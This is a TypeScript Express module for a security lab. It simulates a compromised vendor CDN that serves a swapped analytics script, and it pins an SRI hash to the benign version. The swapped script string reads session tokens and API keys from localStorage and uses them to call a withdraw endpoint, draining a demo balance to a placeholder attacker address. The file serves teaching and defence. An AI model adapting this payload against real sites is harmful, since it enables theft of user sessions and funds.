import express from 'express';
import crypto from 'node:crypto';

// The benign analytics script. Its content is STABLE so its hash is stable,
// which lets the hardened build pin a real SRI hash against it.
export const BENIGN_ANALYTICS = `// analytics.js (benign v1) — served by the lab's pretend vendor CDN
(function(){
  try {
    var t0 = (window.performance && performance.now) ? performance.now() : Date.now();
    addEventListener('load', function(){
      var now = (window.performance && performance.now) ? performance.now() : Date.now();
      var ms = Math.round(now - t0);
      var el = document.getElementById('vendor-status');
      if (el) el.textContent = 'analytics.js v1 (benign): page loaded in ' + ms + 'ms. Nothing left your browser.';
    });
  } catch (e) {}
})();
`;

// The "swapped" script. It performs the Polymarket pattern AGAINST THIS SANDBOX ONLY:
// read whatever the page left in JS reach, then call the app's own withdraw endpoint.
// It contains no real drainer code and can only touch this lab's in-memory demo balance.
export const MALICIOUS_ANALYTICS = `// analytics.js (SWAPPED v2) — the lab is role-playing a compromised vendor. Sandbox only.
(function(){
  var APP = location.origin; // a cross-origin script runs in the page's context, so this is the exchange
  function log(stage, data){ try { fetch(APP + '/lab/_attack-log', {method:'POST', mode:'cors', headers:{'content-type':'application/json'}, body: JSON.stringify({stage:stage, data:data})}); } catch(e){} }
  try {
    var token = localStorage.getItem('sessionToken');
    var apiKey = localStorage.getItem('apiKey');
    log('read-storage', { sawSessionToken: !!token, sawApiKey: !!apiKey });
    var banner = document.getElementById('attack-banner');
    if (!token && !apiKey) { log('nothing-to-steal', {}); if (banner){ banner.style.display='block'; banner.textContent='A malicious vendor script ran, but found no token in storage to steal.'; } return; }
    fetch(APP + '/api/withdraw', {
      method:'POST', mode:'cors',
      headers: { 'content-type':'application/json', 'authorization':'Bearer '+token, 'x-api-key': apiKey||'', 'x-initiated-by':'analytics-script' },
      body: JSON.stringify({ amount: 10000, to: '0xATTACKER_sandbox_only' })
    }).then(function(r){ return r.json(); }).then(function(res){
      log('withdraw', res);
      var b = document.getElementById('balance'); if (b && res && typeof res.balanceUSD === 'number') b.textContent = res.balanceUSD.toLocaleString();
      if (banner){ banner.style.display='block'; banner.textContent = 'A third-party script just read your session token and drained the demo balance to the attacker. In the hardened build this never runs.'; }
    }).catch(function(e){ log('withdraw-failed', {message:String(e)}); if (banner){ banner.style.display='block'; banner.textContent='The malicious script tried to withdraw but the request was refused: ' + e; } });
  } catch (e) { log('error', {message:String(e)}); }
})();
`;

export function benignSri(algo: 'sha384' | 'sha256' = 'sha384'): string {
  return `${algo}-${crypto.createHash(algo).update(BENIGN_ANALYTICS).digest('base64')}`;
}

/** A standalone "vendor CDN" on its own origin, with a compromise switch. */
export function createVendorApp() {
  const app = express();
  app.use(express.json());
  const state = { compromised: false, requests: 0 };
  app.use((req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'content-type');
    res.setHeader('Cache-Control', 'no-store');
    if (req.method === 'OPTIONS') return res.status(204).end();
    next();
  });
  app.get('/analytics.js', (_req, res) => {
    state.requests++;
    res.type('application/javascript').send(state.compromised ? MALICIOUS_ANALYTICS : BENIGN_ANALYTICS);
  });
  app.get('/state', (_req, res) => res.json(state));
  app.post('/compromise', (req, res) => { state.compromised = !!req.body?.on; res.json({ compromised: state.compromised }); });
  app.post('/reset', (_req, res) => { state.compromised = false; res.json({ ok: true }); });
  return { app, state };
}
